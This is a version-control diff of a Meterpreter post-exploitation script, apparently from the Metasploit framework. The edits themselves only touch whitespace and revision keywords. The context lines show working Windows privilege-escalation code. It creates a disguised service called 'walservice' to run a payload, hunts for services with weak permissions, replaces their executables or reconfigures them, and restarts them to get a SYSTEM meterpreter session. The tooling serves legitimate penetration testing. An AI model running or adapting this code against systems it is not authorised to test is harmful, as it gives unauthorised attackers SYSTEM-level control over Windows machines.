@@ -1,15 +1,17 @@
 ##
-# $Id: service_permissions_escalate.rb scriptjunkie $
+# $Id$
 #
 # Many services are configured with insecure permissions. This
 # script attempts to create a service, then searches through a list of
-# existing services to look for insecure file or configuration 
+# existing services to look for insecure file or configuration
 # permissions that will let it replace the executable with a payload.
-# It will then attempt to restart the replaced service to run the 
+# It will then attempt to restart the replaced service to run the
 # payload. If that fails, the next time the service is started (such as
 # on reboot) the attacker will gain elevated privileges.
-# 
+#
 # scriptjunkie   googlemail   com
+#
+# $Revision$
 ##
 
 if client.platform !~ /win32/
@@ -95,17 +97,17 @@ manag = adv.OpenSCManagerA(nil,nil,0x10013)
 if(manag["return"] != 0)
 	# SC_MANAGER_CREATE_SERVICE = 0x0002
 	newservice = adv.CreateServiceA(manag["return"],"walservice","Windows Application Layer",0x0010,0X00000010,2,0,tempexe,nil,nil,nil,nil,nil)
-	#SERVICE_START=0x0010  SERVICE_WIN32_OWN_PROCESS= 0X00000010  
+	#SERVICE_START=0x0010  SERVICE_WIN32_OWN_PROCESS= 0X00000010
 	#SERVICE_AUTO_START = 2 SERVICE_ERROR_IGNORE = 0
 	if(newservice["return"] != 0)
-		print_status("Created service... #{newservice["return"]}")	
+		print_status("Created service... #{newservice["return"]}")
 		ret = adv.StartServiceA(newservice["return"], 0, nil)
 		print_status("Service should be started! Enjoy your new SYSTEM meterpreter session.")
 		service_delete("walservice")
 		adv.CloseServiceHandle(newservice["return"])
 		if aggressive == false
 			adv.CloseServiceHandle(manag["return"])
-			raise Rex::Script::Completed 
+			raise Rex::Script::Completed
 		end
 	else
 		print_status("Uhoh. service creation failed, but we should have the permissions. :-(")
@@ -152,7 +154,7 @@ service_list.each do |serv|
 			moved = true
 		end
 		#try to exploit weak config permissions
-		#open with SERVICE_CHANGE_CONFIG (0x0002)  
+		#open with SERVICE_CHANGE_CONFIG (0x0002)
 		servhandleret = adv.OpenServiceA(manag["return"],serv,2)
 		if(servhandleret["return"] != 0)
 			#SERVICE_NO_CHANGE is  0xFFFFFFFF
@@ -186,7 +188,7 @@ service_list.each do |serv|
 					adv.CloseServiceHandle(servhandleret["return"])
 				end
 				if aggressive == false
-					raise Rex::Script::Completed 
+					raise Rex::Script::Completed
 				end
 			else
 				print_status("Could not restart #{serv}. Wait for a reboot. (or force one yourself)")
